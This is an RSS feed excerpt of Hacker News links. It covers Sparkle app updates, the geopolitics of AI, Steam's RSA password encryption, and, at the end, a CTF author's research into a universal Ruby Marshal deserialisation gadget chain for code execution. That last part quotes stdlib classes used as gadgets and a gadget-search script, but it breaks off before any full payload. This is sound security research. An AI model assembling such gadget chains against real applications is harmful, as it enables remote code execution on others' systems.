and the most common — is to use <a href="https://sparkle-project.org/">Sparkle</a>. It’s been around for many many years and is pretty much the official way to distribute updates for Mac apps distributed outside the Mac App Store.</p><p>Sparkle is currently living a double life of sorts. You can either use the “legacy” version of Sparkle or use a more modern “v2” branch which includes many improvements such as the ability to update sandboxed apps. I still use the “legacy” version because it’s the one that I’m familiar with and I find that integrating the more modern version is still a bit more complicated. If it ain’t broke, don’t fix it.</p><p>The process of generating an app update usually goes as follows: ensure that with every update you increase the app’s version (of course), produce the package as described before (Sparkle can handle zips, DMGs and installer packages), then use the <code>generate_appcast</code> tool to update the feed. After doing that, upload the deltas, the package for the new version, and the updated AppCast …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rambo.codes/posts/2021-01-08-distributing-mac-apps-outside-the-app-store">https://rambo.codes/posts/2021-01-08-distributing-mac-apps-outside-the-app-store</a></em></p>]]>
            </description>
            <link>https://rambo.codes/posts/2021-01-08-distributing-mac-apps-outside-the-app-store</link>
            <guid isPermaLink="false">hacker-news-small-sites-25684705</guid>
            <pubDate>Fri, 08 Jan 2021 13:53:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Geopolitics of AI: Element.AI imploding accelerates tech dependence on US&China]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25684700">thread link</a>) | @urlwolf
<br/>
January 8, 2021 | https://josequesada.com/how-element-ai-imploding-accelerates-tech-dependence-on-us-and-china-geopolitics-of-ai/ | <a href="https://web.archive.org/web/*/https://josequesada.com/how-element-ai-imploding-accelerates-tech-dependence-on-us-and-china-geopolitics-of-ai/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>New Tech produces economic and political disruption at scale. This was the effect of Naval fleets to project power, electricity, the steam engine, and rail.<br></p><p>AI can be the most disruptive tech of the 21st century because it is a general-purpose tech (not limited to say hauling loads). AI also has zero distribution costs (being digital). But the value AI brings to the world is distributed unevenly. Let's consider AI's geopolitics.<br></p><p>Geopolitics is the study of the effects of Earth's geography on politics and international relations. It provides context and improves decision making at the macro (and sometimes not so macro) level. Geopolitics focuses on states and countries, but for the geopolitics of AI, Companies are a better unit than countries. Why? Because in AI we care about talent and data. Both are mobile and malleable (when compared to mountains and rivers) but still have some geo-specificity (German data may not be very useful in North Korea).<br></p><p>According to Kai-Fu lee's 'AI superpowers' book, there are seven AI giants (the equivalent of nation powers): Google, Facebook, Amazon, Microsoft, Ali Baba, Tencent, and Baidu. Beyond those seven, there's a dramatic drop in companies' AI capabilities. All world companies outside the 'seven giants' put together have fewer AI capabilities than any single giant. Let's call them the AI-poor.<br></p><p>The gap between AI-rich and AI-poor is widening extremely fast, because AI is a winner-takes-all game: if one company cracks the autonomous vehicle problem, it wins the entire market. There’s no point for an AI-poor to ‘clone’ it, and have an ‘also ran’ technology that is second best: if ‘number one’ gets a successful trip 99,9% of the time, and ‘number two’ gets only 95%, that makes ‘number two’ not viable. A car company will buy ‘number one’s’ product because we are talking about human lives. They need to buy the technology from an AI-rich. We will explore the consequences of this technology dependency in this article.<br></p><p>What makes these AI-rich companies different? The seven AI giants have (1) Talent (2) Data and (3) infrastructure. Plus the seven AI giants are all platforms. The Platform business model is the most successful business model in the 21st century. A platform is a business model that creates value by facilitating exchanges between two or more interdependent groups, usually consumers and producers. In order to make these exchanges happen, platforms harness and create large, scalable networks of users and resources that can be accessed on demand. Platforms create communities and markets with network effects that allow users to interact and transact. Platform companies have far higher profits and growth than any other. For example, Google around 2016 (according to a VP of search, personal communication) had 21% yearly growth and &nbsp;20% profit. These numbers were similar for Microsoft, and completely out of range for most non-platform companies, particularly enterprises. Platforms are also very difficult to displace, their network effects building an effective moat. &nbsp; <br></p><p>AI, with its zero distribution cost (digital), plugs perfectly into platforms. The seven giants use their AI and data advantage to try and enter every industry: health, HR, finance, retail, banking. It’s important to understand that even before we consider AI, these seven giants are completely different animals compared to the incumbents that reign in every vertical. The incumbents are often ‘linear companies’, not platforms, and often they are not very far in the digitalization scale. Their business model didn’t change from what was successful in the 20th century. This makes it very hard for them to take advantage of AI.<br></p><h2 id="but-is-ai-really-so-valuable"><strong>But is AI really so valuable?</strong></h2><p>To answer this question Take DeepMind, a British AI company that was bought by google in 2014. DeepMind's algorithms saved enough of Google’s data center electricity costs to pay back the purchase price in the first year. Since then DeepMind has been in the news because they solved problems that most considered impossible, including beating the human champion at the game of Go.<br></p><p>DeepMind’s last breakthrough helps finding 3D structure of proteins. Scientists have identified more than 200m proteins but structures are known for only a fraction of them. Traditionally, the shapes are discovered through meticulous lab work that can take years. Alphafold, DeepMind's algorithm, managed to find structures and nearly two-thirds were comparable in quality to experimental structures. This was one of the grand challenges in biology. Alphafold matters because proteins define and power ALL life functions. It would vastly accelerate efforts to understand the building blocks of cells and enable quicker and more advanced drug discovery.<br></p><p>Andrei Lupas, the director of the Max Planck Institute for Developmental Biology in Tübingen, Germany, said he had already used the program to solve a protein structure that scientists had been stuck on for a decade.<br></p><h2 id="-ai-poor-companies-and-countries-have-no-choice-but-to-buy-ai-from-someone"><strong>'AI-poor' companies and countries have no choice but to buy AI from someone</strong><br></h2><p>Because the 'winner takes all' dynamics of AI, it's tough for an 'AI-poor' to create state-of-the-art AI in-house. They often don't have talent, data, or infrastructure. There’s no way around: they have to import AI.<br></p><p>The 'seven giants' strategy is to sell AI through automation. According to Kai-Fu Lee, if AI is the new electricity, they are the utility companies. They are installing 'the grid' to satisfy demand. Let's use Google as an example of how this strategy pans out.<br></p><p>Google has Tensor Processing units (TPUs), a technology that makes AI computation far cheaper than the previous generation (GPUs). It's in Google's interest that any 'AI-poor' consumes AI through Google cloud services. Because this is an eminently scalable business, google needs to make AI as easy to consume as possible. They are investing in how to simplify usage, expand use cases, educating businesses. The goal is that any AI-poor country or company can consume AI/cloud from them even with limited resources in talent or infrastructure. <br></p><p>Most of the AI-poor countries have political leaders who understand how risky this tech dependency is and try to minimize it at all costs. This is where Element.AI (And Canada!) could have been just the ticket!</p><h2 id="how-canada-and-element-ai-could-have-maintained-an-equilibrium"><strong>How Canada, and Element AI, could have maintained an equilibrium</strong></h2><p>Canada has the most deep learning researchers per capita in the entire world, and some of the best labs. <br></p><p>The country saw their ridiculously abundant researcher pool as an opportunity. They funded companies and changed visa policies to make sure Canada would become an AI-rich country. One that would provide services in AI to the AI-poor countries. Stopping the brain drain to the US was an extra layer of goodness.<br></p><p>Canada has excellent relationships with the G7. All G7 members (excluding the US, which hosts 4 of the 7 giants) have a skill deficit in AI. They would have been happy to buy Canadian AI, as they cannot buy AI from the US nor China: it would be a geopolitical mistake to be more in their hands than they already are. &nbsp;Canada could have become a competitor to the two AI superpowers (US and China) if it played its cards right. This is extraordinary: most other countries would kill to be in that position as their industries' revenues dwindle down. <br></p><p>The spearhead of Canada’s strategy was Element AI. A company with about 500 employees world-class-level at deep learning, rivaling the concentration of talent in DeepMind. A company with Joshua Bengio, one of the Godfathers of the field, as a cofounder. A company with &gt;300 million USD in funding over 4 years. Element AI became the self-appointed representative of Canada’s AI sector. A company that couldn’t fail. Or could it? <br></p><p>Element AI, designed to avoid Canadian talent leaving for the US, was just bought by ServiceNow, a Californian company. Element AI was ServiceNow’s fourth AI acquisition in 2020, following Loom Systems, Passage AI, and Sweagle.<br></p><div><p>Having the full support of the government didn’t help finding a business model that worked. And they withered in the vine. This is a historic moment. The implosion of element AI marks the end of an era. One where Canada could raise to match the AI sophistication of the US and China, and serve the AI-poor countries.</p></div><h2 id="effect-for-the-ai-poor-the-weak-now-weaker"><strong>Effect for the AI-poor: the weak, now weaker</strong><br></h2><p>There were two opportunities for an 'AI-poor’' country to catch up: DeepMind and elementAI. Deepmind went to google, enlarging an already tremendous advantage in AI and data, and the UK must have lamented their decision to let that happen ever since.<br></p><p>ElementAI went to a US company before they could produce anything of significant value, but they were still a gigantic whale that could have ‘fed’ an AI-poor country for a decade.<br></p><p>The chances of another AI company of that caliber forming anywhere outside the US and China are virtually zero. The ‘AI-poor’ world has missed the last opportunity to create a stronghold. The G7 (minus the US) will have to attach themselves to one of the two AI superpowers, in a deal that would get progressively worse as the value AI provides grows compared to traditional industries such as manufacturing.<br></p><p>I can see two possible scenarios.<br></p><h2 id="pessimistic-scenario"><strong>Pessimistic scenario</strong></h2><ul><li>Even with lots of open source libraries and models, the 'AI-poors' manage to not get value out of AI on their own. Their dependency on the big 7 keeps going up.<br></li><li>Every AI-poor country is a tech colony of the US or China. And at this point there's no way out (after DeepMind and ElementAI are off the market, and local talent is not enough to defend any possible local AI or data advantage).<br></li><li>The market value of '20th century economy' (manufacturing) keeps going down, profits are slim, and the purchase power of industrial-era countries dwindles versus that of AI rich countries.<br></li><li>AI nationalism and cyber neo-colonialism explains many geopolitical transactions in the 21st century. Political realignment depending on who provides your AI.<br></li><li>Talent and data centralizes on a few companies in the …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://josequesada.com/how-element-ai-imploding-accelerates-tech-dependence-on-us-and-china-geopolitics-of-ai/">https://josequesada.com/how-element-ai-imploding-accelerates-tech-dependence-on-us-and-china-geopolitics-of-ai/</a></em></p>]]>
            </description>
            <link>https://josequesada.com/how-element-ai-imploding-accelerates-tech-dependence-on-us-and-china-geopolitics-of-ai/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25684700</guid>
            <pubDate>Fri, 08 Jan 2021 13:52:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Steam's login method is kinda interesting // owlspace]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25684254">thread link</a>) | @hutattedonmyarm
<br/>
January 8, 2021 | https://owlspace.xyz/cybersec/steam-login/ | <a href="https://web.archive.org/web/*/https://owlspace.xyz/cybersec/steam-login/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><article><header></header><p>How do you send a password over the internet? You acquire a SSL certificate and let TLS do the job of securely transporting the password from client to server. Of course it’s not as cut-and-dry as I’m making it out to be, but the gist of it holds true and stood the test of time. This hasn’t always been this way though, and one incredibly popular storefront on the world wide web prefers to add a little extra to this day. I’ll be discussing Steam’s unique method of logging in their users, and go down a deep rabbit hole of fascinating implementation details.</p><h3 id="pointing-out-the-obvious">Pointing out the obvious</h3><p>I found a StackOverflow question from 2013 <a href="https://stackoverflow.com/questions/1582894/how-to-send-password-securely-over-http">asking how to securely send a password over HTTP</a>. The answers are pretty unanimous: get a SSL certificate. Here’s an experiment: set up your favorite traffic-capturing proxy, browse to a service you frequently use, log in with your account (or preferably a throwaway), and inspect the requests. You will most certainly find that your username and password are sent as-is in a HTTP request body. The only reason this works is because your connection to the server is encrypted using TLS.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/so-real-host.png" alt="StackOverflow user asking what to do if a webhost doesn't support SSL certificates, told to move to a real webhost"><figcaption><p>Weird to think that this used to be an issue</p></figcaption></figure><p>The internet was a different place though in the early 2010s, let alone the many years prior. We now have services like <a href="https://letsencrypt.org/">Let’s Encrypt</a> which issue SSL certificates free of charge for a period of three months, with automatic renewals if desired. There really wasn’t much of a way around acquiring a SSL certificate for money, but usually with extended validity and support. You could certainly argue that there is a price to be paid for the security and privacy of your users, but that didn’t stop questions like the one I linked from appearing.</p><p>Now that we all agree that TLS is important, let’s switch it up. Let’s pretend we cannot send a password over HTTPS and have to somehow make it work with plain HTTP, while also providing users with some level of security. There’s the <code>Authorization</code> header which is standardized and widely accepted. However, in conjunction with the “Basic” HTTP Authentication scheme, it provides no security if used in plain HTTP.</p><p>There are tried and tested challenge-response algorithms, most notably <a href="https://en.wikipedia.org/wiki/Secure_Remote_Password_protocol">SRP</a> which is designed to do password-based authentication without ever actually sending the password, but you probably have to implement them yourself and a slight oversight could cause serious harm. You could also defer authentication to an external service. “Sign in with service XYZ” is commonly used, but comes with its own ramifications. All things considered, it’s not trivial to send secrets over an inheretly insecure connection.</p><p>So when me and a friend took Steam apart in search for traces of personally identifiable information, I was surprised to see that Steam’s login page doesn’t only rely on TLS to ensure that your password stays protected.</p><h3 id="crypto-cherry-on-top">Crypto cherry on top</h3><p>Again, grab your favorite traffic-capturing proxy and navigate to <a href="https://store.steampowered.com/login">Steam’s login page</a>. Enter your username and password and you will (hopefully) be asked to enter a one-time token generated by your preferred two-factor authentication method. You can stop right there, because the magic I want to point out has already happened. You’ll find that pressing the login button launches a request against an odd endpoint: <code>/login/getrsakey</code>, followed by <code>/login/dologin</code>.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/getrsa-call.png" alt="Requests to fetch script assets, acquire RSA key and perform login"><figcaption><p>All relevant assets and requests in succession</p></figcaption></figure><p>Inspect the request for <code>/login/getrsakey</code> and you’ll find a JSON-formatted response, containing fields with names that should look very familiar to anyone who’s briefly dealt with public key cryptography. You’re given a RSA public key, though the exact values might look a bit odd. It’s clear that <code>publickey_mod</code> and <code>publickey_exp</code> define the modulus and the exponent used in encryption, but the former is given in hexadecimal while the latter appears to be given in binary (I’ll get back on that later). There’s also a timestamp which has no immediately recognizable starting point. As to what the purpose of <code>token_gid</code> is, I have no clue yet.</p><div><pre><code data-lang="json"><span>{</span>
    <span>"success"</span><span>:</span><span>true</span><span>,</span>
    <span>"publickey_mod"</span><span>:</span><span>"c85ba44d5a3608561cb289795ac93b34d4b9b4326f9c09d1d19a9923e2d136b8..."</span><span>,</span>
    <span>"publickey_exp"</span><span>:</span><span>"010001"</span><span>,</span>
    <span>"timestamp"</span><span>:</span><span>"1260462250000"</span><span>,</span>
    <span>"token_gid"</span><span>:</span><span>"2701e0b0a4be3635"</span>
<span>}</span>
</code></pre></div><p>The login page pulls some scripts on load. There is the main login handler contained in <code>login.js</code> which is completely unobfuscated, so anyone can just analyze it and find out what it does. The site also loads some additional dependencies, namely <code>jsbn.js</code> and <code>rsa.js</code>.</p><p>A quick search for the name mentioned in the first line of <code>jsbn.js</code> reveals that these two scripts are the work of <a href="http://www-cs-students.stanford.edu/~tjw/">Tom Wu</a> — a MIT and Stanford graduate who likes software engineering and computer cryptography. They released <code>jsbn.js</code> and <code>rsa.js</code> as pure JavaScript implementations of arbitrary precision integers and RSA encryption/decryption respectively. You’ll also find that these libraries have had their most recent updates in 2005 and 2013 which is a bit of information I’ll come back to later. For now, just keep it in mind.</p><h3 id="going-down-the-rsabbit-hole">Going down the r(s)abbit hole</h3><p>So now that we have all relevant assets, let’s dig around in <code>login.js</code>. The code is a bit of a mess with lots of callbacks and proxied function calls, but it turns out the parts of interest can be easily condensed. In essence, the script can be boiled down to a couple of steps, each step assuming that everything went fine in the previous step.</p><ol><li>The user enters their username and password and presses the login button.</li><li><code>DoLogin</code> is called, which checks if the login mask was filled out correctly and launches a request against <code>/login/getrsakey</code>.</li><li><code>OnRSAKeyResponse</code> is called. This checks if the response is well-formed.</li><li><code>GetAuthCode</code> is called. It runs some platform-specific code in case there are any 2FA measures active on the user’s account.</li><li><code>OnAuthCodeResponse</code> is called. This is where the password is encrypted using RSA and the request against <code>/login/dologin</code> is prepared and executed.</li><li><code>OnLoginResponse</code> is called. The user is logged in and redirected to the Steam storefront.</li></ol><p>The code in <code>OnAuthCodeResponse</code> shows why the requested public key is formatted the way that it is. Starting at line 387 in the source file, the modulus and exponent of the <code>/login/getrsakey</code> response are passed as-is to the RSA library. The user’s password is then encrypted with the given public key and added to the request against <code>/login/dologin</code> in the subsequent login step.</p><div><pre><code data-lang="js"><span>var</span> <span>pubKey</span> <span>=</span> <span>RSA</span><span>.</span><span>getPublicKey</span><span>(</span><span>results</span><span>.</span><span>publickey_mod</span><span>,</span> <span>results</span><span>.</span><span>publickey_exp</span><span>);</span>
<span>var</span> <span>username</span> <span>=</span> <span>this</span><span>.</span><span>m_strUsernameCanonical</span><span>;</span>
<span>var</span> <span>password</span> <span>=</span> <span>form</span><span>.</span><span>elements</span><span>[</span><span>'password'</span><span>].</span><span>value</span><span>;</span>
<span>password</span> <span>=</span> <span>password</span><span>.</span><span>replace</span><span>(</span><span>/[^\x00-\x7F]/g</span><span>,</span> <span>''</span><span>);</span> <span>// remove non-standard-ASCII characters
</span><span></span><span>var</span> <span>encryptedPassword</span> <span>=</span> <span>RSA</span><span>.</span><span>encrypt</span><span>(</span><span>password</span><span>,</span> <span>pubKey</span><span>);</span>
</code></pre></div><p>I copied the source files onto my local machine to explore the RSA library a little bit. Both the modulus and the exponent are passed to the function <code>RSAPublicKey</code> which behaves like a constructor in the “pre-class” JavaScript era. <code>RSAPublicKey</code> simply wraps both values into instances of <code>BigInteger</code> provided by the <code>jsbn.js</code> script. It was to my surprise that the exponent is actually not represented in binary but, just like the modulus, in hexadecimal. (Also, turns out <code>0x010001</code> is a <a href="https://stackoverflow.com/questions/6098381/what-are-common-rsa-sign-exponent">very common encryption exponent</a> in RSA implementations.) So now it’s clear that the password encryption is based on 2048-bit RSA with an encryption exponent of 65537.</p><div><pre><code data-lang="js"><span>let</span> <span>r</span> <span>=</span> <span>RSA</span><span>.</span><span>getPublicKey</span><span>(</span><span>"c85ba44d5a360856..."</span> <span>/* insert your own long modulus here */</span><span>,</span> <span>"010001"</span><span>);</span>
<span>console</span><span>.</span><span>log</span><span>(</span><span>r</span><span>.</span><span>encryptionExponent</span><span>.</span><span>toString</span><span>());</span> <span>// =&gt; "65537"
</span><span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>r</span><span>.</span><span>modulus</span><span>.</span><span>bitLength</span><span>());</span> <span>// =&gt; 2048
</span></code></pre></div><p>Moving on to the <code>timestamp</code> field. The <code>/login/getrsakey</code> response contains an <code>Expires</code> header. It references a date in the past, meaning that the response is absolutely not meant to be cached or persisted in any way. If you check back on <code>/login/getrsakey</code> over a longer period of time, you’ll notice that the public key changes ever so often and, as such, its timestamp value too. This means there’s only a limited time frame in which a certain Steam-issued RSA public key can be used to authenticate.</p><p>This becomes even more evident when examining the subsequent request against <code>/login/dologin</code>. Among many other things, it contains the username, encrypted password as well as the timestamp of the issued RSA public key. Trying to perform a login attempt while altering the timestamp fails as expected. But more importantly, it’s also not possible to reuse an older public key, even if the password is correctly encrypted.</p><p>I went one step further and <a href="https://gist.github.com/JoogsWasTaken/8a8e60859e1721255c57e9185eb6cb10">wrote a simple Python script to collect public keys</a> over the span of three days using a throwaway account. I let it run every five minutes using a cronjob. The goal was to check just how often Steam’s public keys change and to hopefully find out how the <code>timestamp</code> field behaves.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/sqlite-pubkeys.png" alt="SQLite database containing public keys sourced from Steam"><figcaption><p>Lots and lots and lots of public keys</p></figcaption></figure><p>I found that the public key changes every 12 entries, meaning that it’s safe to assume that they rotate every hour. The encryption exponent stays the same — no surprises here. More intriguing however is the aforementioned <code>timestamp</code> field. For every 12 public keys, the value of the <code>timestamp</code> increases by a certain amount, namely 3600000000 and then some. And what’s more is that this number wraps around after some period of time as can be seen in the following image. Be warned, because all of what I’m about to say is highly speculative.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/sqlite-wraparound.png" alt="Public key entries where the timestamp value wraps around in-between"><figcaption><p>Timestamp field wrapping around</p></figcaption></figure><p>I found that 3600000000 microseconds is equal to one hour, making me assume that the value of the <code>timestamp</code> field is, in fact, given in microseconds. However, I already hinted at the fact that the timestamp value doesn’t increase by one hour exactly with every new public key. In my own data, I observed that the difference between two successive timestamps is one hour plus 1 to 2.6 seconds, with most being in the order of about 1.05 to 1.25 seconds. But this raises another interesting possibility.</p><p>Let’s assume that a new public key is generated every hour plus one second. If I query the public key …</p></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://owlspace.xyz/cybersec/steam-login/">https://owlspace.xyz/cybersec/steam-login/</a></em></p>]]>
            </description>
            <link>https://owlspace.xyz/cybersec/steam-login/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25684254</guid>
            <pubDate>Fri, 08 Jan 2021 13:05:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Universal Ruby 2.x-3.x deserialisation gadget to achieve RCE]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25684217">thread link</a>) | @Techbrunch
<br/>
January 8, 2021 | https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html | <a href="https://web.archive.org/web/*/https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content_wrap">
    <section id="main_content">
      <article itemscope="" itemtype="http://schema.org/BlogPosting">
  

  <div itemprop="articleBody">
    <p>One of the challenges I wrote for <a href="https://ctftime.org/event/1121">pbctf 2020</a> involved exploiting deserialisation in a rails app to get code execution and retrieve the flag. The challenge was running with ruby 2.7.2 and rails 6.1, which meant that the existing public gadgets no longer worked and players had to discover a new one.</p>

<p>While researching, I came across a fantastic article published by <a href="https://twitter.com/elttam">elttam</a> titled <a href="https://www.elttam.com/blog/ruby-deserialization/">Ruby 2.x Universal RCE Deserialization Gadget Chain</a>. It goes into great detail on how they came up with a universal gadget that did not require anything other than the default gems to be loaded, well worth a read if you haven’t already.</p>

<p>Since the challenge was written using rails, there was a lot more gems and classes to choose from compared to just the defaults. There were a few great solutions to the challenge by players, the one I found combined the original <code>DeprecatedInstanceVariableProxy</code> gadget to call the <code>execute</code> method on <a href="https://github.com/rails/rails/blob/v6.1.0.rc1/activemodel/lib/active_model/attribute_methods.rb#L369">ActiveModel::AttributeMethods::ClassMethods::CodeGenerator</a> to achieve code execution.</p>

<p>After the ctf was over I decided to keep looking around to see if I could find another universal gadget, as the <code>Gem::StubSpecification</code> gadget used in the elttam article <a href="https://github.com/ruby/ruby/commit/1eaacb1ef538fe5af2fe231bb340fc39fef67547#diff-5daf0b4d40af647b25014bfbd30abaa25e34bd298d8503c180bb1f59edbdb885">was patched</a> in ruby 2.7+.</p>

<p>I started off trying to find a class to be used as a replacement for <code>Gem::StubSpecification</code>, something that allowed for code execution, eval, or the ability to call arbitrary methods. Using the same <code>autoload</code> trick in the elttam article and lots of regex searches in RubyMine, I came across <a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/net/protocol.rb#L458">Net::WriteAdapter</a>:</p>

<div><div><pre><code><span>class</span> <span>WriteAdapter</span>
  <span>def</span> <span>initialize</span><span>(</span><span>socket</span><span>,</span> <span>method</span><span>)</span>
    <span>@socket</span> <span>=</span> <span>socket</span>
    <span>@method_id</span> <span>=</span> <span>method</span>
  <span>end</span>

  <span>def</span> <span>inspect</span>
    <span>"#&lt;</span><span>#{</span><span>self</span><span>.</span><span>class</span><span>}</span><span> socket=</span><span>#{</span><span>@socket</span><span>.</span><span>inspect</span><span>}</span><span>&gt;"</span>
  <span>end</span>

  <span>def</span> <span>write</span><span>(</span><span>str</span><span>)</span>
    <span>@socket</span><span>.</span><span>__send__</span><span>(</span><span>@method_id</span><span>,</span> <span>str</span><span>)</span>
  <span>end</span>

  <span>alias</span> <span>print</span> <span>write</span>

  <span>def</span> <span>&lt;&lt;</span><span>(</span><span>str</span><span>)</span>
    <span>write</span> <span>str</span>
    <span>self</span>
  <span>end</span>

  <span>def</span> <span>puts</span><span>(</span><span>str</span> <span>=</span> <span>''</span><span>)</span>
    <span>write</span> <span>str</span><span>.</span><span>chomp</span><span>(</span><span>"</span><span>\n</span><span>"</span><span>)</span> <span>+</span> <span>"</span><span>\n</span><span>"</span>
  <span>end</span>

  <span>def</span> <span>printf</span><span>(</span><span>*</span><span>args</span><span>)</span>
    <span>write</span> <span>sprintf</span><span>(</span><span>*</span><span>args</span><span>)</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>It looked very promising as <code>@socket</code> and <code>@method_id</code> could both be set to anything, and if a way to call any of the methods <code>write</code>, <code>print</code>, <code>&lt;&lt;</code>, <code>puts</code> or <code>printf</code> could be found it would allow any method to be called on an object.</p>

<p>After many dead ends and a lot more searching I found <a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/net/protocol.rb#L113">Net::BufferedIO</a>, which had the following <code>LOG</code> method:</p>

<div><div><pre><code>    <span>def</span> <span>read</span><span>(</span><span>len</span><span>,</span> <span>dest</span> <span>=</span> <span>''</span><span>.</span><span>b</span><span>,</span> <span>ignore_eof</span> <span>=</span> <span>false</span><span>)</span>
      <span>LOG</span> <span>"reading </span><span>#{</span><span>len</span><span>}</span><span> bytes..."</span>
    <span>#...</span>

    <span>def</span> <span>LOG</span><span>(</span><span>msg</span><span>)</span>
      <span>return</span> <span>unless</span> <span>@debug_output</span>
      <span>@debug_output</span> <span>&lt;&lt;</span> <span>msg</span> <span>+</span> <span>"</span><span>\n</span><span>"</span>
    <span>end</span>

    <span>def</span> <span>eof?</span>
      <span>@io</span><span>.</span><span>eof?</span>
    <span>end</span>
</code></pre></div></div>

<p>This was called by both <code>read</code> and <code>readall</code>, so it could be chained to <code>Net::WriteAdapter</code> if a way to call <code>read</code> could be found.</p>

<p>I had also started looking for initial/kick-off gadgets, similar to the <code>Gem::Requirement</code> one that called <code>each</code> in the elttam article. One of the interesting ones found was <a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/version.rb#L275">Gem::Version</a> which allowed calling <code>to_s</code> on any object (relevant code):</p>

<div><div><pre><code><span># we can fully control the objects in this array</span>
<span>def</span> <span>marshal_load</span><span>(</span><span>array</span><span>)</span>
  <span>initialize</span> <span>array</span><span>[</span><span>0</span><span>]</span>
<span>end</span>

<span>def</span> <span>initialize</span><span>(</span><span>version</span><span>)</span>
  <span># first thing is the version check</span>
  <span>unless</span> <span>self</span><span>.</span><span>class</span><span>.</span><span>correct?</span><span>(</span><span>version</span><span>)</span>
    <span>raise</span> <span>ArgumentError</span><span>,</span> <span>"Malformed version number string </span><span>#{</span><span>version</span><span>}</span><span>"</span>
  <span>end</span>

  <span>version</span> <span>=</span> <span>0</span> <span>if</span> <span>version</span><span>.</span><span>is_a?</span><span>(</span><span>String</span><span>)</span> <span>&amp;&amp;</span> <span>version</span> <span>=~</span> <span>/\A\s*\Z/</span>
  <span>@version</span> <span>=</span> <span>version</span><span>.</span><span>to_s</span><span>.</span><span>strip</span><span>.</span><span>gsub</span><span>(</span><span>"-"</span><span>,</span><span>".pre."</span><span>)</span>
  <span>@segments</span> <span>=</span> <span>nil</span>
<span>end</span>

<span>def</span> <span>self</span><span>.</span><span>correct?</span><span>(</span><span>version</span><span>)</span>
  <span>unless</span> <span>Gem</span><span>::</span><span>Deprecate</span><span>.</span><span>skip</span>
    <span>warn</span> <span>"nil versions are discouraged and will be deprecated in Rubygems 4"</span> <span>if</span> <span>version</span><span>.</span><span>nil?</span>
  <span>end</span>

  <span># here to_s is called on our object</span>
  <span>!!</span><span>(</span><span>version</span><span>.</span><span>to_s</span> <span>=~</span> <span>ANCHORED_VERSION_PATTERN</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>To find these methods, I slightly modified the existing <code>marshal_load</code> method check to quickly see what implemented a function:</p>

<div><div><pre><code><span>def</span> <span>check</span><span>(</span><span>functions</span><span>)</span>
  <span>ObjectSpace</span><span>.</span><span>each_object</span><span>(</span><span>::</span><span>Class</span><span>)</span> <span>do</span> <span>|</span><span>obj</span><span>|</span>
    <span>all_methods</span> <span>=</span> <span>(</span><span>obj</span><span>.</span><span>instance_methods</span> <span>+</span> <span>obj</span><span>.</span><span>private_instance_methods</span><span>).</span><span>uniq</span>

    <span>functions</span><span>.</span><span>each</span> <span>do</span> <span>|</span><span>function</span><span>|</span>
      <span>if</span> <span>all_methods</span><span>.</span><span>include?</span> <span>function</span>
        <span>method_origin</span> <span>=</span> <span>obj</span><span>.</span><span>instance_method</span><span>(</span><span>function</span><span>).</span><span>inspect</span><span>[</span><span>/\((.*)\)/</span><span>,</span> <span>1</span><span>]</span> <span>||</span> <span>obj</span><span>.</span><span>to_s</span>
        <span>unless</span> <span>method_origin</span><span>.</span><span>nil?</span> <span>||</span> <span>method_origin</span> <span>==</span> <span>''</span>
          <span>puts</span> <span>obj</span>
          <span>puts</span> <span>"  </span><span>#{</span><span>function</span><span>}</span><span> defined by </span><span>#{</span><span>method_origin</span><span>}</span><span>"</span>
          <span>puts</span> <span>"  ancestors = </span><span>#{</span><span>obj</span><span>.</span><span>ancestors</span><span>}</span><span>"</span>
          <span>puts</span>
        <span>end</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>This opened up more options for finding gadgets, as there are quite a few <code>to_s</code> methods implemented compared to <code>marshal_load</code>. A few examples that were found:</p>

<p><a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/resolver/activation_request.rb#L79">Gem::Resolver::ActivationRequest</a> which would allow for <code>name</code>, <code>version</code>, or <code>platform</code> to be called on a controllable object:</p>

<div><div><pre><code><span>class</span> <span>Gem::Resolver::ActivationRequest</span>
  <span>alias_method</span> <span>:to_s</span><span>,</span> <span>:full_name</span>

  <span>def</span> <span>full_name</span>
    <span>name_tuple</span><span>.</span><span>full_name</span>
  <span>end</span>

  <span>def</span> <span>name_tuple</span>
    <span>@name_tuple</span> <span>||=</span> <span>Gem</span><span>::</span><span>NameTuple</span><span>.</span><span>new</span><span>(</span><span>name</span><span>,</span> <span>version</span><span>,</span> <span>platform</span><span>)</span>
  <span>end</span>

  <span>def</span> <span>name</span>
    <span>@spec</span><span>.</span><span>name</span>
  <span>end</span>

  <span>def</span> <span>version</span>
    <span>@spec</span><span>.</span><span>version</span>
  <span>end</span>

  <span>def</span> <span>platform</span>
    <span>@spec</span><span>.</span><span>platform</span>
  <span>end</span>
</code></pre></div></div>

